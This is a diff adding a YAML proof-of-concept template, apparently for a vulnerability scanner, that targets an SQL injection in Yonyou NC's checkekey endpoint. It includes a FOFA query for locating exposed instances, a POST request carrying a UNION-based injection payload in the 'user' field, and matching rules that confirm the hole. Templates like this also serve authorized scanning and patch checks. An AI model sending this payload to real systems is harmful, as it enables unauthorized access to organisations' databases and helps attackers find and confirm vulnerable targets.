@@ -1,0 +1,19 @@
+id: poc-yaml-yongyou-nc-checkekey-sqli
+info:
+  name: 用友NC checkekey SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+requests:
+- method: POST
+  path: /portal/pt/office/checkekey?pageId=login
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: user=1' UNION ALL SELECT NULL,CHR(113)||CHR(113)||CHR(112)||CHR(122)||CHR(113)||CHR(80)||CHR(103)||CHR(106)||CHR(122)||CHR(81)||CHR(70)||CHR(74)||CHR(104),NULL,NULL,NULL,NULL,NULL,NULL,NULL
+    FROM DUAL-- twnX&ekey=1
+  expression: status_code == 500 && contains(body,"qqpzqPgjzQFJh") && contains(body,"Error")
+    && contains(body,"invalid UFDateTime")
+variables: {}
+transport: http
